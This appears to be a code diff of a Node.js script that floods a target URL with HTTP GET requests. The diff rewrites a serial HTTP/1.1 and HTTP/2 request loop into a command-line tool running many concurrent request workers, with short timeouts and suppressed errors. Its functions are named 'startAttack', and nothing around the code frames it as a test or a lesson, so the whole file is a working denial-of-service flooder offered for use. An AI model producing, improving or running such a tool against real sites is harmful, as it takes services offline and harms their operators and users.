@@ -1,63 +1,45 @@
-const http = require('http');
-const http2 = require('http2');
 const axios = require('axios');
 
-function sendHttp1GetRequest(targetUrl) {
-  axios.get(targetUrl)
-    .then(response => {
-      console.log(`HTTP/1.1 Status: ${response.status}`);
-    })
-    .catch(error => {
-      console.error(`HTTP/1.1 Error: ${error.message}`);
+async function sendHttpRequest(targetUrl) {
+  try {
+    await axios({
+      method: 'GET',
+      url: targetUrl,
+      timeout: 1000, // Set timeout to ensure quick termination if the site is down
     });
+  } catch (error) {
+    // Handle error silently
+  }
 }
 
-function sendHttp2GetRequest(targetUrl) {
-  const client = http2.connect(targetUrl);
-
-  client.on('error', (err) => console.error(`HTTP/2 Connection Error: ${err.message}`));
-
-  const req = client.request({
-    ':method': 'GET',
-    ':path': '/',
-  });
-
-  req.setEncoding('utf8');
-  req.end();
-
-  req.on('response', (headers, flags) => {
-    console.log('HTTP/2 Response:', headers[':status']);
-  });
-
-  req.on('error', (err) => {
-    console.error(`HTTP/2 Error: ${err.message}`);
-  });
-
-  req.on('end', () => {
-    client.close();
-  });
-}
-
-function startAttack(targetUrl, duration, method) {
+async function startAttack(targetUrl, duration, numThreads) {
   const endTime = Date.now() + duration * 1000;
 
-  const attackFunction = method === 'http1' ? sendHttp1GetRequest : sendHttp2GetRequest;
+  console.log('Starting attack...');
 
-  while (Date.now() < endTime) {
-    attackFunction(targetUrl);
+  const tasks = [];
+  for (let i = 0; i < numThreads; i++) {
+    tasks.push(new Promise(async (resolve) => {
+      while (Date.now() < endTime) {
+        await sendHttpRequest(targetUrl);
+        console.log('Attack Sending...');
+      }
+      resolve();
+    }));
   }
+
+  await Promise.all(tasks);
 
   console.log('Attack finished');
 }
 
 const targetUrl = process.argv[2];
 const duration = parseInt(process.argv[3], 10);
-const method = process.argv[4];
+const numThreads = parseInt(process.argv[4], 10);
 
-if (!targetUrl || !duration || !method) {
-  console.log('Usage: node pogi.js <targetUrl> <durationInSeconds> <method (http1 or http2)>');
+if (!targetUrl || isNaN(duration) || isNaN(numThreads)) {
+  console.log('Usage: node pogi.js <targetUrl> <durationInSeconds> <numThreads>');
   process.exit(1);
 }
 
-startAttack(targetUrl, duration, method);
-  
+startAttack(targetUrl, duration, numThreads);
